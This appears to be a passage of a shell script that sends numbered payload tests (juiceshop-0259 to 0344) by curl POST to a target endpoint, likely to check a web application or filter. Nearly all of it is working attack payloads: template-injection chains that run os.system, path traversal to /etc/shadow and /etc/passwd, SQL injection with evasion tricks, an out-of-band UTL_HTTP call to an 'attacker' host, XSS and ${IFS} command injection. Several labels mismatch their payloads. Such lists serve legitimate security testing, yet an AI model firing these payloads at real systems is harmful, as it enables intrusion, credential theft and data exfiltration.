  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.util.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0259' 'xss' '$\{self.module.runtime.util.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0260' 'xss' '$\{self.module.runtime.exceptions.traceback.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0261' 'xss' '$\{self.module.runtime.exceptions.util.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0262' 'xss' '$\{self.template._mmarker.module.cache.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0263' 'xss' '$\{self.template.module.cache.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.cache.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0264' 'xss' '$\{self.attr._NSAttr__parent.template.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0265' 'xss' '$\{self.template._mmarker.module.filters.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0266' 'xss' '$\{self.template._mmarker.module.runtime.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0267' 'xss' '$\{self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0268' 'xss' '$\{self.template._mmarker.module.runtime.exceptions.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0269' 'xss' '$\{self.template.module.filters.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.filters.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0270' 'xss' '$\{self.template.module.runtime.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0271' 'xss' '$\{self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0272' 'xss' '$\{self.context._with_template._mmarker.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template._mmarker.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0273' 'xss' '$\{self.template.module.runtime.exceptions.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0274' 'xss' '$\{self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0275' 'xss' '$\{self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0276' 'xss' '$\{self.context._with_template.module.cache.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template.module.cache.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0277' 'xss' '$\{self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0278' 'xss' '$\{self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0279' 'xss' '$\{self.context._with_template._mmarker.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0280' 'xss' '$\{self.context._with_template.module.filters.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template.module.filters.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0281' 'xss' '$\{self.context._with_template.module.runtime.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0282' 'xss' '$\{self.context._with_template.module.runtime.exceptions.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0283' 'xss' '$\{self.template.module.runtime.exceptions.traceback.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0284' 'xss' '..%2f..%2f..%2fwin.ini' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..%2f..%2f..%2fwin.ini"}'
do_curl 'juiceshop-0285' 'xss' '/var/www/html/../../../etc/shadow' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "/var/www/html/../../../etc/shadow"}'
do_curl 'juiceshop-0286' 'xss' '..\\\\..\\\\..\\\\boot.ini' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..\\\\\\\\..\\\\\\\\..\\\\\\\\boot.ini"}'
do_curl 'juiceshop-0287' 'sqli' ''\''/**/OR/**/1/**/=/**/1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''/**/OR/**/1/**/=/**/1--"}'
do_curl 'juiceshop-0288' 'sqli' ''\''%09OR%091=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''%09OR%091=1"}'
do_curl 'juiceshop-0289' 'sqli' ''\''%20oR%201=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''%20oR%201=1--"}'
do_curl 'juiceshop-0290' 'sqli' ''\''+UNION+SELECT+NULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''+UNION+SELECT+NULL,NULL--"}'
do_curl 'juiceshop-0291' 'sqli' ''\''/*!12345OR*/1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''/*!12345OR*/1=1--"}'
do_curl 'juiceshop-0292' 'sqli' ''\''+/*!00000SELECT*/+NULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''+/*!00000SELECT*/+NULL,NULL--"}'
do_curl 'juiceshop-0293' 'sqli' ''\'' AND 1=1#' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND 1=1#"}'
do_curl 'juiceshop-0294' 'sqli' ''\'' OR TRUE--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR TRUE--"}'
do_curl 'juiceshop-0295' 'sqli' ''\'' AND SLEEP(3)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND SLEEP(3)--"}'
do_curl 'juiceshop-0296' 'sqli' ''\''%2f**%2fOR%2f**%2f1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''%2f**%2fOR%2f**%2f1=1--"}'
do_curl 'juiceshop-0297' 'sqli' '1'\'' or '\''1'\''='\''1'\'' --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' or '\''1'\''='\''1'\'' --"}'
do_curl 'juiceshop-0298' 'sqli' '1 or 1=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1 or 1=1"}'
do_curl 'juiceshop-0299' 'sqli' '0'\'' OR 1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "0'\'' OR 1=1--"}'
do_curl 'juiceshop-0300' 'sqli' ''\'' OR 1=1 LIMIT 1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1 LIMIT 1--"}'
do_curl 'juiceshop-0301' 'sqli' ''\''||UTL_HTTP.REQUEST('\''http://attacker'\'')' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||UTL_HTTP.REQUEST('\''http://attacker'\'')"}'
do_curl 'juiceshop-0302' 'sqli' ''\''||CHR(97)||CHR(98)||CHR(99)=abc' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||CHR(97)||CHR(98)||CHR(99)=abc"}'
do_curl 'juiceshop-0303' 'sqli' ''\'' UNION/**/SELECT/**/NULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' UNION/**/SELECT/**/NULL,NULL--"}'
do_curl 'juiceshop-0304' 'sqli' ''\'' or if(1=1,sleep(2),0)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' or if(1=1,sleep(2),0)--"}'
do_curl 'juiceshop-0305' 'sqli' '0x27206f7220313d31--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "0x27206f7220313d31--"}'
do_curl 'juiceshop-0306' 'sqli' '%u0027%20OR%201=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%u0027%20OR%201=1--"}'
do_curl 'juiceshop-0307' 'sqli' '%2527%2520OR%25201=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2527%2520OR%25201=1--"}'
do_curl 'juiceshop-0308' 'sqli' '%27UNION%0ASELECT%0ANULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27UNION%0ASELECT%0ANULL,NULL--"}'
do_curl 'juiceshop-0309' 'sqli' '1'\'' AND (SELECT 1 FROM dual WHERE 1=1)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' AND (SELECT 1 FROM dual WHERE 1=1)--"}'
do_curl 'juiceshop-0310' 'sqli' '1'\'' AND (SELECT sleep(3))--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' AND (SELECT sleep(3))--"}'
do_curl 'juiceshop-0311' 'sqli' ''\'' OR EXISTS(SELECT * FROM users)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR EXISTS(SELECT * FROM users)--"}'
do_curl 'juiceshop-0312' 'sqli' ''\'' AND (SELECT 1 WHERE SUBSTRING(@@version,1,1)='\''5'\'')--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND (SELECT 1 WHERE SUBSTRING(@@version,1,1)='\''5'\'')--"}'
do_curl 'juiceshop-0313' 'sqli' '1/**/OR/**/'\''1'\''/**/=/**/'\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1/**/OR/**/'\''1'\''/**/=/**/'\''1"}'
do_curl 'juiceshop-0314' 'sqli' '1+oR+1=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1+oR+1=1"}'
do_curl 'juiceshop-0315' 'sqli' '1%0bOR%0b1=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1%0bOR%0b1=1"}'
do_curl 'juiceshop-0316' 'xss' '1/**/oR/**/1/**/=/**/1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1/**/oR/**/1/**/=/**/1"}'
do_curl 'juiceshop-0317' 'sqli' '0'\''/**/UNION/**/SELECT/**/NULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "0'\''/**/UNION/**/SELECT/**/NULL,NULL--"}'
do_curl 'juiceshop-0318' 'sqli' ''\''||mid(version(),1,1)=5' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||mid(version(),1,1)=5"}'
do_curl 'juiceshop-0319' 'sqli' ''\''--%00' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''--%00"}'
do_curl 'juiceshop-0320' 'xss' '/etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "/etc/passwd"}'
do_curl 'juiceshop-0321' 'sqli' ''\''/**/UNION/**/SELECT/**/NULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''/**/UNION/**/SELECT/**/NULL,NULL--"}'
do_curl 'juiceshop-0322' 'sqli' '1'\''/**/OR/**/'\''1'\''/**/=/**/'\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''/**/OR/**/'\''1'\''/**/=/**/'\''1"}'
do_curl 'juiceshop-0323' 'xss' '<IFRAME SRC="jav&#x09;ascript:alert(1)">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<IFRAME SRC=\"jav&#x09;ascript:alert(1)\">"}'
do_curl 'juiceshop-0324' 'lfi' '....%5C....%5C....%5Cetc%5Cpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "....%5C....%5C....%5Cetc%5Cpasswd"}'
do_curl 'juiceshop-0325' 'sqli' '1'\'' AND 1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' AND 1=1--"}'
do_curl 'juiceshop-0326' 'xss' '1'\''||'\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''||'\''1"}'
do_curl 'juiceshop-0327' 'sqli' '1'\''--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''--"}'
do_curl 'juiceshop-0328' 'sqli' '1'\'';--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'';--"}'
do_curl 'juiceshop-0329' 'sqli' '1%27--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1%27--"}'
do_curl 'juiceshop-0330' 'sqli' '1'\''/**/OR/**/1/**/=/**/1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''/**/OR/**/1/**/=/**/1--"}'
do_curl 'juiceshop-0331' 'sqli' '1'\''/*+*/OR/*+*/1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''/*+*/OR/*+*/1=1--"}'
do_curl 'juiceshop-0332' 'sqli' ''\'' oR '\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' oR '\''1'\''='\''1"}'
do_curl 'juiceshop-0333' 'sqli' ''\'' oR 1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' oR 1=1--"}'
do_curl 'juiceshop-0334' 'sqli' '%31%27%20--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%31%27%20--"}'
do_curl 'juiceshop-0335' 'sqli' '1'\'' --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' --"}'
do_curl 'juiceshop-0336' 'sqli' '%27%2F**%2FOR%2F**%2F1%3D1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%2F**%2FOR%2F**%2F1%3D1--"}'
do_curl 'juiceshop-0337' 'sqli' '1 AND 1=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1 AND 1=1"}'
do_curl 'juiceshop-0338' 'sqli' '1 OR 1=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1 OR 1=1"}'
do_curl 'juiceshop-0339' 'xss' ''\''||' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||"}'
do_curl 'juiceshop-0340' 'xss' ''\''||1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||1"}'
do_curl 'juiceshop-0341' 'sqli' '1-- -' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1-- -"}'
do_curl 'juiceshop-0342' 'cmdi' 'sh$\{IFS\}-c$\{IFS\}whoami' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "sh$\\{IFS\\}-c$\\{IFS\\}whoami"}'
do_curl 'juiceshop-0343' 'cmdi' 'bash$\{IFS\}-c$\{IFS\}'\''id'\''' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "bash$\\{IFS\\}-c$\\{IFS\\}'\''id'\''"}'
do_curl 'juiceshop-0344' 'cmdi' '$\{IFS\}'\''id'\''}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{IFS\\}'\''id'\''}"}'
